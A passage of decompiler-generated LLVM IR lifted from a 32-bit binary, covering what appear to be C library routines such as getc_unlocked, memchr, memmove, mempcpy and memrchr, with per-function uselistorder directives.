  %v2_80525dd = add i32 %v0_80525dd, %v0_80525d5
  store i32 %v2_80525dd, i32* %edi.global-to-local, align 4
  %v1_80525df = load i32, i32* %esi.global-to-local, align 4
  %v7_80525df = icmp ult i32 %v1_80525da, %v1_80525df
  br i1 %v7_80525df, label %dec_label_pc_80525bc, label %dec_label_pc_80525e3

dec_label_pc_80525e3:                             ; preds = %dec_label_pc_80525da, %dec_label_pc_80525ab
  %v0_80525e9 = phi i32 [ -1, %dec_label_pc_80525ab ], [ %v2_80525dd, %dec_label_pc_80525da ]
  store i32 %v0_80525e9, i32* %eax.global-to-local, align 4
  %v2_80525ec = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80525ec, i32* @esi, align 4
  store i32 %v0_805202e, i32* @edi, align 4
  store i32 %v0_805202d, i32* @ebp, align 4
  ret i32 %v0_80525e9

; uselistorder directives
  uselistorder i32 %v0_80525e9, { 1, 0 }
  uselistorder i32 %v1_8052539, { 1, 2, 0 }
  uselistorder i32 %v0_8052537, { 1, 0 }
  uselistorder i32 %v0_80525b4, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v0_805250a, { 1, 0 }
  uselistorder i32 %v9_8052501, { 1, 2, 3, 0 }
  uselistorder i32 %v0_80524f9, { 1, 0 }
  uselistorder i32 %v0_80524cb, { 0, 2, 1, 3 }
  uselistorder i32 %v2_80524a4, { 1, 0 }
  uselistorder i32 %v1_80524a4, { 1, 0, 2 }
  uselistorder i32 %v2_80524a2, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_80523d8, { 2, 1, 3, 0 }
  uselistorder i32 %v2_80523be, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_8052423, { 4, 0, 3, 1, 2, 5, 6, 7 }
  uselistorder i32 %v0_8052389, { 0, 2, 1 }
  uselistorder i32 %v1_8052362, { 1, 0 }
  uselistorder i32 %v0_805235d, { 1, 2, 0, 3 }
  uselistorder i32 %v2_805232a, { 1, 2, 3, 0, 4 }
  uselistorder i8 %v2_8052325, { 1, 0 }
  uselistorder i8 %v2_805231e, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_805231e, { 1, 0, 3, 2 }
  uselistorder i32 %v0_80522a8, { 1, 2, 0 }
  uselistorder i8 %stack_var_-206.1, { 3, 1, 4, 0, 2 }
  uselistorder i8 %v4_805228d, { 1, 0 }
  uselistorder i32 %v1_8052279, { 1, 0 }
  uselistorder i32 %v0_805226d, { 1, 0 }
  uselistorder i32 %v4_8052254, { 1, 0 }
  uselistorder i32 %tmp149, { 3, 1, 2, 0 }
  uselistorder x86_fp80 %v3_8052259, { 1, 0 }
  uselistorder i32 %v2_8052217, { 1, 0, 2 }
  uselistorder i3 %v1_80520cd, { 1, 0 }
  uselistorder i8 %v4_805214c, { 1, 0 }
  uselistorder i32 %v3_805208b, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_805208b, { 1, 0, 2 }
  uselistorder i8 %stack_var_-206.0, { 3, 2, 0, 4, 5, 1, 6, 7 }
  uselistorder i32 %v1_805205d, { 1, 0 }
  uselistorder i32 %v3_805204b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-71, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 2, 0, 1 }
  uselistorder i32* %stack_var_-27, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 0, 1, 4, 2, 3 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %tmp112, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 0, 1, 2, 4, 3 }
  uselistorder x86_fp80* %st0.global-to-local, { 2, 0, 1, 3 }
  uselistorder i3* %fpu_stat_TOP.global-to-local, { 0, 5, 4, 6, 7, 1, 8, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7, 10, 9, 11, 8, 12, 13, 14, 15 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 5, 6, 9, 13, 12, 14, 10, 11, 15, 18, 16, 19, 17, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 5, 4, 6, 8, 7, 9 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 3, 5, 6, 4, 7, 8, 9, 10, 14, 11, 12, 0, 15, 16, 13, 20, 17, 18, 19, 21, 22, 23, 24 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 2, 7, 8, 3, 9, 6, 4, 10, 5, 11 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 4, 5, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i64 10, { 1, 0, 2 }
  uselistorder i8 56, { 1, 0 }
  uselistorder i8 102, { 4, 1, 0, 3, 2 }
  uselistorder i8 103, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80525b6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80525b4, { 1, 0 }
  uselistorder label %dec_label_pc_8052533, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80524e5, { 1, 0 }
  uselistorder label %dec_label_pc_80524bd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805248c, { 1, 0 }
  uselistorder label %dec_label_pc_8052479, { 1, 0 }
  uselistorder label %dec_label_pc_805245f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805242c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052417, { 1, 0 }
  uselistorder label %dec_label_pc_805240c, { 1, 0 }
  uselistorder label %dec_label_pc_8052393, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052385, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805234b, { 1, 0 }
  uselistorder label %dec_label_pc_805231b.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_80522e7, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80522b6, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80522a1, { 1, 0 }
  uselistorder label %dec_label_pc_8052158, { 1, 0 }
  uselistorder label %dec_label_pc_805207c, { 1, 0 }
  uselistorder label %dec_label_pc_8052073, { 1, 0 }
}

define i32 @getc_unlocked() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16* @__decompiler_undefined_function_6()
  %stack_var_-5 = alloca i8, align 1
  %v0_80525f0 = load i32, i32* @ebx, align 4
  %v4_80525f4 = ptrtoint i16* %tmp to i32
  store i32 %v4_80525f4, i32* @ebx, align 4
  %v1_80525f8 = add i32 %v4_80525f4, 16
  %v2_80525f8 = inttoptr i32 %v1_80525f8 to i32*
  %v3_80525f8 = load i32, i32* %v2_80525f8, align 4
  %v2_80525fb = add i32 %v4_80525f4, 24
  %v3_80525fb = inttoptr i32 %v2_80525fb to i32*
  %v4_80525fb = load i32, i32* %v3_80525fb, align 4
  %v10_80525fb = icmp ult i32 %v3_80525f8, %v4_80525fb
  br i1 %v10_80525fb, label %dec_label_pc_805269d, label %dec_label_pc_8052604

dec_label_pc_8052604:                             ; preds = %entry
  %v2_8052604 = load i16, i16* %tmp, align 2
  %v3_8052604 = zext i16 %v2_8052604 to i32
  %v1_8052607 = and i32 %v3_8052604, 131
  %v6_8052611 = icmp ugt i32 %v1_8052607, 128
  br i1 %v6_8052611, label %dec_label_pc_805262b, label %dec_label_pc_8052613

dec_label_pc_8052613:                             ; preds = %dec_label_pc_8052604
  %v0_8052613 = load i32, i32* @edx, align 4
  %v6_805261b = call i32 @__stdio_trans2r_o(i16* nonnull %tmp, i32 128, i32 %v0_8052613, i32 %v0_8052613)
  %v1_8052623 = icmp eq i32 %v6_805261b, 0
  %v1_8052625 = icmp eq i1 %v1_8052623, false
  br i1 %v1_8052625, label %dec_label_pc_80526c2, label %dec_label_pc_8052613.dec_label_pc_805262b_crit_edge

dec_label_pc_8052613.dec_label_pc_805262b_crit_edge: ; preds = %dec_label_pc_8052613
  %v0_805262b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805262b

dec_label_pc_805262b:                             ; preds = %dec_label_pc_8052613.dec_label_pc_805262b_crit_edge, %dec_label_pc_8052604
  %v2_805265f = phi i32 [ %v0_805262b.pre, %dec_label_pc_8052613.dec_label_pc_805262b_crit_edge ], [ %v4_80525f4, %dec_label_pc_8052604 ]
  %v1_805262b = inttoptr i32 %v2_805265f to i32*
  %v2_805262b = load i32, i32* %v1_805262b, align 4
  store i32 %v2_805262b, i32* @ecx, align 4
  %v1_805262d = urem i32 %v2_805262b, 65536
  store i32 %v1_805262d, i32* %edx.global-to-local, align 4
  %v2_8052630 = and i32 %v2_805262b, 2
  %v3_8052630 = icmp eq i32 %v2_8052630, 0
  br i1 %v3_8052630, label %dec_label_pc_805264e, label %dec_label_pc_8052635

dec_label_pc_8052635:                             ; preds = %dec_label_pc_805262b
  %v1_8052635 = urem i32 %v2_805262b, 2
  store i32 %v1_8052635, i32* %edx.global-to-local, align 4
  %v1_8052638 = add i32 %v2_805262b, 65535
  %v1_805263b = trunc i32 %v1_8052638 to i16
  %v3_805263b = inttoptr i32 %v2_805265f to i16*
  store i16 %v1_805263b, i16* %v3_805263b, align 2
  %v0_805263e = load i32, i32* @ebx, align 4
  %v1_805263e = load i32, i32* %edx.global-to-local, align 4
  %v2_805263e = mul i32 %v1_805263e, 4
  %v3_805263e = add i32 %v0_805263e, 36
  %v4_805263e = add i32 %v3_805263e, %v2_805263e
  %v5_805263e = inttoptr i32 %v4_805263e to i8*
  %v6_805263e = load i8, i8* %v5_805263e, align 1
  %v7_805263e = zext i8 %v6_805263e to i32
  %v9_805263e = and i32 %v1_805263e, -256
  %v10_805263e = or i32 %v7_805263e, %v9_805263e
  store i32 %v10_805263e, i32* %edx.global-to-local, align 4
  %v1_8052642 = add i32 %v0_805263e, 40
  %v2_8052642 = inttoptr i32 %v1_8052642 to i32*
  store i32 0, i32* %v2_8052642, align 4
  %v0_8052649 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052649 = urem i32 %v0_8052649, 256
  store i32 %v1_8052649, i32* @edx, align 4
  br label %dec_label_pc_80526c5

dec_label_pc_805264e:                             ; preds = %dec_label_pc_805262b
  %v1_805264e = add i32 %v2_805265f, 16
  %v2_805264e = inttoptr i32 %v1_805264e to i32*
  %v3_805264e = load i32, i32* %v2_805264e, align 4
  store i32 %v3_805264e, i32* @eax, align 4
  %v1_8052651 = add i32 %v2_805265f, 20
  %v2_8052651 = inttoptr i32 %v1_8052651 to i32*
  %v3_8052651 = load i32, i32* %v2_8052651, align 4
  %v15_8052651 = icmp eq i32 %v3_8052651, %v3_805264e
  %v1_8052654 = icmp eq i1 %v15_8052651, false
  br i1 %v1_8052654, label %dec_label_pc_805269d, label %dec_label_pc_8052656

dec_label_pc_8052656:                             ; preds = %dec_label_pc_805264e
  %v1_8052656 = add i32 %v2_805265f, 4
  %v2_8052656 = inttoptr i32 %v1_8052656 to i32*
  %v3_8052656 = load i32, i32* %v2_8052656, align 4
  %v13_8052656 = icmp eq i32 %v3_8052656, -2
  %v1_805265a = icmp eq i1 %v13_8052656, false
  br i1 %v1_805265a, label %dec_label_pc_8052664, label %dec_label_pc_805265c

dec_label_pc_805265c:                             ; preds = %dec_label_pc_8052656
  %v1_805265c = or i32 %v2_805262b, 4
  store i32 %v1_805265c, i32* @ecx, align 4
  %v1_805265f = trunc i32 %v1_805265c to i16
  %v3_805265f = inttoptr i32 %v2_805265f to i16*
  store i16 %v1_805265f, i16* %v3_805265f, align 2
  br label %dec_label_pc_80526c2

dec_label_pc_8052664:                             ; preds = %dec_label_pc_8052656
  %v1_8052664 = udiv i32 %v2_805262b, 256
  %v2_8052664 = trunc i32 %v1_8052664 to i8
  %v3_8052664 = urem i8 %v2_8052664, 4
  %v4_8052664 = icmp eq i8 %v3_8052664, 0
  %v8_8052664 = zext i8 %v3_8052664 to i32
  %v10_8052664 = mul nuw nsw i32 %v8_8052664, 256
  %v11_8052664 = urem i32 %v2_805262b, 256
  %v12_8052664 = or i32 %v10_8052664, %v11_8052664
  store i32 %v12_8052664, i32* %edx.global-to-local, align 4
  br i1 %v4_8052664, label %dec_label_pc_8052679, label %dec_label_pc_8052669

dec_label_pc_8052669:                             ; preds = %dec_label_pc_8052664
  %v3_8052671 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_8059878.200 to i16*))
  %v0_8052679.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8052679

dec_label_pc_8052679:                             ; preds = %dec_label_pc_8052664, %dec_label_pc_8052669
  %v0_80526ae = phi i32 [ %v2_805265f, %dec_label_pc_8052664 ], [ %v0_8052679.pre, %dec_label_pc_8052669 ]
  %v1_8052679 = add i32 %v0_80526ae, 8
  %v2_8052679 = inttoptr i32 %v1_8052679 to i32*
  %v3_8052679 = load i32, i32* %v2_8052679, align 4
  %v1_805267c = add i32 %v0_80526ae, 12
  %v2_805267c = inttoptr i32 %v1_805267c to i32*
  %v3_805267c = load i32, i32* %v2_805267c, align 4
  %v15_805267c = icmp eq i32 %v3_805267c, %v3_8052679
  br i1 %v15_805267c, label %dec_label_pc_80526a6, label %dec_label_pc_8052681

dec_label_pc_8052681:                             ; preds = %dec_label_pc_8052679
  %v2_8052684 = add i32 %v0_80526ae, 24
  %v3_8052684 = inttoptr i32 %v2_8052684 to i32*
  store i32 %v3_8052679, i32* %v3_8052684, align 4
  %v0_8052687 = load i32, i32* @ebx, align 4
  %v2_8052688 = call i32 @__stdio_rfill(i32 %v0_8052687)
  %v1_8052690 = icmp eq i32 %v2_8052688, 0
  br i1 %v1_8052690, label %dec_label_pc_80526c2, label %dec_label_pc_8052694

dec_label_pc_8052694:                             ; preds = %dec_label_pc_8052681
  %v0_8052694 = load i32, i32* @ebx, align 4
  %v1_8052694 = add i32 %v0_8052694, 20
  %v2_8052694 = inttoptr i32 %v1_8052694 to i32*
  %v3_8052694 = load i32, i32* %v2_8052694, align 4
  %v2_8052697 = add i32 %v0_8052694, 24
  %v3_8052697 = inttoptr i32 %v2_8052697 to i32*
  store i32 %v3_8052694, i32* %v3_8052697, align 4
  %v0_805269a = load i32, i32* @ebx, align 4
  %v1_805269a = add i32 %v0_805269a, 16
  %v2_805269a = inttoptr i32 %v1_805269a to i32*
  %v3_805269a = load i32, i32* %v2_805269a, align 4
  br label %dec_label_pc_805269d

dec_label_pc_805269d:                             ; preds = %dec_label_pc_805264e, %entry, %dec_label_pc_8052694
  %v1_80526a1 = phi i32 [ %v2_805265f, %dec_label_pc_805264e ], [ %v4_80525f4, %entry ], [ %v0_805269a, %dec_label_pc_8052694 ]
  %v0_805269d = phi i32 [ %v3_805264e, %dec_label_pc_805264e ], [ %v3_80525f8, %entry ], [ %v3_805269a, %dec_label_pc_8052694 ]
  %v1_805269d = inttoptr i32 %v0_805269d to i8*
  %v2_805269d = load i8, i8* %v1_805269d, align 1
  %v3_805269d = zext i8 %v2_805269d to i32
  store i32 %v3_805269d, i32* @edx, align 4
  %v1_80526a0 = add i32 %v0_805269d, 1
  %v2_80526a1 = add i32 %v1_80526a1, 16
  %v3_80526a1 = inttoptr i32 %v2_80526a1 to i32*
  store i32 %v1_80526a0, i32* %v3_80526a1, align 4
  %v0_80526c5.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80526c5

dec_label_pc_80526a6:                             ; preds = %dec_label_pc_8052679
  %v2_80526a9 = ptrtoint i8* %stack_var_-5 to i32
  %v5_80526ae = inttoptr i32 %v0_80526ae to i16*
  %v5_80526af = call i32 @__stdio_READ(i16* %v5_80526ae, i32 %v2_80526a9, i32 1)
  %v1_80526b7 = icmp eq i32 %v5_80526af, 0
  br i1 %v1_80526b7, label %dec_label_pc_80526c2, label %dec_label_pc_80526bb

dec_label_pc_80526bb:                             ; preds = %dec_label_pc_80526a6
  %v3_80526bb = load i8, i8* %stack_var_-5, align 1
  %v4_80526bb = sext i8 %v3_80526bb to i32
  store i32 %v4_80526bb, i32* @edx, align 4
  br label %dec_label_pc_80526c5

dec_label_pc_80526c2:                             ; preds = %dec_label_pc_80526a6, %dec_label_pc_8052681, %dec_label_pc_8052613, %dec_label_pc_805265c
  store i32 -1, i32* @edx, align 4
  br label %dec_label_pc_80526c5

dec_label_pc_80526c5:                             ; preds = %dec_label_pc_80526bb, %dec_label_pc_805269d, %dec_label_pc_8052635, %dec_label_pc_80526c2
  %v0_80526c5 = phi i32 [ %v4_80526bb, %dec_label_pc_80526bb ], [ %v0_80526c5.pre, %dec_label_pc_805269d ], [ %v1_8052649, %dec_label_pc_8052635 ], [ -1, %dec_label_pc_80526c2 ]
  store i32 %v0_80525f0, i32* @ebx, align 4
  ret i32 %v0_80526c5

; uselistorder directives
  uselistorder i32 %v0_805269d, { 1, 0 }
  uselistorder i32 %v3_8052679, { 1, 0 }
  uselistorder i32 %v0_80526ae, { 0, 1, 3, 2 }
  uselistorder i8 %v3_8052664, { 1, 0 }
  uselistorder i32 %v3_805264e, { 1, 0, 2 }
  uselistorder i32 %v1_8052649, { 1, 0 }
  uselistorder i32 %v2_805262b, { 1, 0, 4, 5, 2, 6, 3, 7 }
  uselistorder i32 %v2_805265f, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i8* %stack_var_-5, { 1, 0 }
  uselistorder i32 (i16*)* @fflush_unlocked, { 1, 0 }
  uselistorder i32 131, { 1, 0 }
  uselistorder label %dec_label_pc_80526c5, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80526c2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_805269d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052679, { 1, 0 }
}

define i32 @__GI_memchr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_80526cc = load i32, i32* @edi, align 4
  store i32 %v0_80526cc, i32* %stack_var_-4, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v4_80526d3 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80526d3, i32* %edi.global-to-local, align 4
  %v1_80526db = icmp eq i32 %arg3, 0
  store i1 %v1_80526db, i1* %zf.global-to-local, align 1
  br i1 %v1_80526db, label %dec_label_pc_80526eb, label %dec_label_pc_80526df

dec_label_pc_80526df:                             ; preds = %entry
  %v2_80526df = call i32 @_strlen(i8* %arg1)
  %v3_80526df = mul i32 %v2_80526df, -1
  %v4_80526df = add i32 %v3_80526df, -2
  store i32 %v4_80526df, i32* @ecx, align 4
  %v0_80526e1 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_80526e1, label %dec_label_pc_80526df.dec_label_pc_80526e8_crit_edge, label %dec_label_pc_80526e3

dec_label_pc_80526df.dec_label_pc_80526e8_crit_edge: ; preds = %dec_label_pc_80526df
  %v0_80526e8.pre = load i32, i32* %edi.global-to-local, align 4
  %phitmp = add i32 %v0_80526e8.pre, -1
  br label %dec_label_pc_80526e8

dec_label_pc_80526e3:                             ; preds = %dec_label_pc_80526df
  store i32 1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80526e8

dec_label_pc_80526e8:                             ; preds = %dec_label_pc_80526df.dec_label_pc_80526e8_crit_edge, %dec_label_pc_80526e3
  %v0_80526e8 = phi i32 [ %phitmp, %dec_label_pc_80526df.dec_label_pc_80526e8_crit_edge ], [ 0, %dec_label_pc_80526e3 ]
  %v8_80526e8 = icmp eq i32 %v0_80526e8, 0
  store i1 %v8_80526e8, i1* %zf.global-to-local, align 1
  store i32 %v0_80526e8, i32* %edi.global-to-local, align 4
  %v2_80526ed.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80526eb

dec_label_pc_80526eb:                             ; preds = %entry, %dec_label_pc_80526e8
  %v2_80526ed = phi i32 [ %v0_80526cc, %entry ], [ %v2_80526ed.pre, %dec_label_pc_80526e8 ]
  %v0_80526eb = phi i32 [ 0, %entry ], [ %v0_80526e8, %dec_label_pc_80526e8 ]
  store i32 %v2_80526ed, i32* @edi, align 4
  ret i32 %v0_80526eb

; uselistorder directives
  uselistorder i32 %v0_80526e8, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_80526eb, { 1, 0 }
  uselistorder label %dec_label_pc_80526e8, { 1, 0 }
}

define i32 @memmove(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_80526f1 = load i32, i32* @esi, align 4
  store i32 %v0_80526f1, i32* %stack_var_-8, align 4
  %v4_80526f2 = ptrtoint i8* %arg1 to i32
  %v9_80526fe = icmp ugt i8* %tmp3, %arg1
  %v1_8052700 = icmp eq i1 %v9_80526fe, false
  br i1 %v1_8052700, label %dec_label_pc_8052708, label %dec_label_pc_8052702

dec_label_pc_8052702:                             ; preds = %entry
  %v7_8052704 = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %tmp)
  br label %dec_label_pc_8052714

dec_label_pc_8052708:                             ; preds = %entry
  %v3_8052708 = add i32 %arg2, -1
  %v4_8052708 = add i32 %v3_8052708, %tmp
  %v5_8052708 = inttoptr i32 %v4_8052708 to i8*
  %v3_805270c = add i32 %v4_80526f2, -1
  %v4_805270c = add i32 %v3_805270c, %tmp
  %v5_805270c = inttoptr i32 %v4_805270c to i8*
  %v7_8052711 = call i8* @_memcpy(i8* %v5_805270c, i8* %v5_8052708, i32 %tmp)
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_8052714

dec_label_pc_8052714:                             ; preds = %dec_label_pc_8052702, %dec_label_pc_8052708
  %v2_8052714 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052714, i32* @esi, align 4
  ret i32 %v4_80526f2

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %tmp, { 1, 3, 2, 0 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052714, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8052718 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_805272b = inttoptr i32 %arg1 to i16*
  %v4_805272b = call i32 @memcpy(i16* %v3_805272b, i32 %arg2, i32 %arg3)
  %v0_8052730 = load i32, i32* @esi, align 4
  %v2_8052730 = add i32 %v0_8052730, %arg3
  store i32 %v0_8052718, i32* @esi, align 4
  ret i32 %v2_8052730
}

define i32 @memrchr(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg2 to i8
  %v4_8052741 = urem i32 %arg2, 256
  %v4_805274d = sext i8 %arg1 to i32
  %v2_8052751 = add i32 %v4_805274d, %arg3
  %v1_80527637 = icmp eq i32 %arg3, 0
  br i1 %v1_80527637, label %dec_label_pc_805276b, label %dec_label_pc_8052767

dec_label_pc_8052755:                             ; preds = %dec_label_pc_8052767
  %v1_8052755 = add i32 %v0_8052755, -1
  %v5_8052756 = load i32, i32* @edx, align 4
  %v6_8052756 = and i32 %v5_8052756, -256
  %v7_8052756 = or i32 %v6_8052756, %v4_8052741
  store i32 %v7_8052756, i32* @edx, align 4
  %v1_805275a = inttoptr i32 %v1_8052755 to i8*
  %v2_805275a = load i8, i8* %v1_805275a, align 1
  %v15_805275a = icmp eq i8 %v2_805275a, %tmp
  br i1 %v15_805275a, label %dec_label_pc_80527e8, label %dec_label_pc_8052762

dec_label_pc_8052762:                             ; preds = %dec_label_pc_8052755
  %v1_8052762 = add i32 %v0_8052762, -1
  %v8_8052762 = icmp eq i32 %v1_8052762, 0
  br i1 %v8_8052762, label %dec_label_pc_805276b, label %dec_label_pc_8052767

dec_label_pc_8052767:                             ; preds = %entry, %dec_label_pc_8052762
  %v0_8052762 = phi i32 [ %v1_8052762, %dec_label_pc_8052762 ], [ %arg3, %entry ]
  %v0_8052755 = phi i32 [ %v1_8052755, %dec_label_pc_8052762 ], [ %v2_8052751, %entry ]
  %v2_8052767 = urem i32 %v0_8052755, 4
  %v3_8052767 = icmp eq i32 %v2_8052767, 0
  %v1_8052769 = icmp eq i1 %v3_8052767, false
  br i1 %v1_8052769, label %dec_label_pc_8052755, label %dec_label_pc_805276b

dec_label_pc_805276b:                             ; preds = %dec_label_pc_8052762, %dec_label_pc_8052767, %entry
  %v0_80527ce.pr = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_8052762 ], [ %v0_8052762, %dec_label_pc_8052767 ]
  %v0_8052770 = phi i32 [ %v2_8052751, %entry ], [ %v1_8052755, %dec_label_pc_8052762 ], [ %v0_8052755, %dec_label_pc_8052767 ]
  store i32 %v0_8052770, i32* @ecx, align 4
  %v2_8052774 = mul nuw nsw i32 %v4_8052741, 256
  %v2_8052777 = or i32 %v2_8052774, %v4_8052741
  %v2_805277b = mul i32 %v2_8052777, 65536
  %v2_805277e = or i32 %v2_805277b, %v2_8052777
  %v6_80527d150 = icmp ugt i32 %v0_80527ce.pr, 3
  br i1 %v6_80527d150, label %dec_label_pc_8052782, label %dec_label_pc_80527d3

dec_label_pc_8052782:                             ; preds = %dec_label_pc_805276b, %dec_label_pc_80527cb
  %v0_80527cb52 = phi i32 [ %v1_80527cb, %dec_label_pc_80527cb ], [ %v0_80527ce.pr, %dec_label_pc_805276b ]
  %v0_805278251 = phi i32 [ %v1_8052782, %dec_label_pc_80527cb ], [ %v0_8052770, %dec_label_pc_805276b ]
  %v1_8052782 = add i32 %v0_805278251, -4
  store i32 %v1_8052782, i32* @ecx, align 4
  %v2_8052787 = inttoptr i32 %v1_8052782 to i32*
  %v3_8052787 = load i32, i32* %v2_8052787, align 4
  %v4_8052787 = xor i32 %v3_8052787, %v2_805277e
  %v1_8052789 = add i32 %v4_8052787, 2130640639
  %v1_805278f = sub i32 -1, %v4_8052787
  %v2_8052791 = xor i32 %v1_8052789, %v1_805278f
  %v1_8052793 = and i32 %v2_8052791, -2130640640
  %v2_8052793 = icmp eq i32 %v1_8052793, 0
  br i1 %v2_8052793, label %dec_label_pc_80527cb, label %dec_label_pc_805279b

dec_label_pc_805279b:                             ; preds = %dec_label_pc_8052782
  %v7_805279b = or i32 %v1_8052793, %v4_8052741
  %v1_805279f = add i32 %v0_805278251, -1
  %v2_80527a2 = inttoptr i32 %v1_805279f to i8*
  %v3_80527a2 = load i8, i8* %v2_80527a2, align 1
  %v16_80527a2 = icmp eq i8 %v3_80527a2, %tmp
  br i1 %v16_80527a2, label %dec_label_pc_80527e8, label %dec_label_pc_80527a7

dec_label_pc_80527a7:                             ; preds = %dec_label_pc_805279b
  %v1_80527ab = add i32 %v0_805278251, -2
  %v2_80527ae = inttoptr i32 %v1_80527ab to i8*
  %v3_80527ae = load i8, i8* %v2_80527ae, align 1
  %v16_80527ae = icmp eq i8 %v3_80527ae, %tmp
  br i1 %v16_80527ae, label %dec_label_pc_80527e8, label %dec_label_pc_80527b3

dec_label_pc_80527b3:                             ; preds = %dec_label_pc_80527a7
  %v1_80527b7 = add i32 %v0_805278251, -3
  %v2_80527ba = inttoptr i32 %v1_80527b7 to i8*
  %v3_80527ba = load i8, i8* %v2_80527ba, align 1
  %v16_80527ba = icmp eq i8 %v3_80527ba, %tmp
  br i1 %v16_80527ba, label %dec_label_pc_80527e8, label %dec_label_pc_80527bf

dec_label_pc_80527bf:                             ; preds = %dec_label_pc_80527b3
  %v1_80527c3 = inttoptr i32 %v1_8052782 to i8*
  %v2_80527c3 = load i8, i8* %v1_80527c3, align 1
  %v15_80527c3 = icmp eq i8 %v2_80527c3, %tmp
  %v1_80527c5 = icmp eq i1 %v15_80527c3, false
  br i1 %v1_80527c5, label %dec_label_pc_80527cb, label %dec_label_pc_80527c7

dec_label_pc_80527c7:                             ; preds = %dec_label_pc_80527bf
  br label %dec_label_pc_80527e8

dec_label_pc_80527cb:                             ; preds = %dec_label_pc_80527bf, %dec_label_pc_8052782
  %v5_80527d827 = phi i32 [ %v7_805279b, %dec_label_pc_80527bf ], [ 0, %dec_label_pc_8052782 ]
  %v1_80527cb = add i32 %v0_80527cb52, -4
  %v6_80527d1 = icmp ugt i32 %v1_80527cb, 3
  br i1 %v6_80527d1, label %dec_label_pc_8052782, label %dec_label_pc_80527d3

dec_label_pc_80527d3:                             ; preds = %dec_label_pc_80527cb, %dec_label_pc_805276b
  %v5_80527d826.lcssa = phi i32 [ %v4_8052741, %dec_label_pc_805276b ], [ %v5_80527d827, %dec_label_pc_80527cb ]
  %v0_8052782.lcssa = phi i32 [ %v0_8052770, %dec_label_pc_805276b ], [ %v1_8052782, %dec_label_pc_80527cb ]
  %v0_80527cb.lcssa = phi i32 [ %v0_80527ce.pr, %dec_label_pc_805276b ], [ %v1_80527cb, %dec_label_pc_80527cb ]
  br label %dec_label_pc_80527e0

dec_label_pc_80527d7:                             ; preds = %dec_label_pc_80527e0
  %v1_80527e0 = add i32 %v0_80527e0, -1
  %v1_80527d7 = add i32 %v0_80527d7, -1
  %v6_80527d8 = and i32 %v5_80527d8, -256
  %v7_80527d8 = or i32 %v6_80527d8, %v4_8052741
  %v1_80527dc = inttoptr i32 %v1_80527d7 to i8*
  %v2_80527dc = load i8, i8* %v1_80527dc, align 1
  %v15_80527dc = icmp eq i8 %v2_80527dc, %tmp
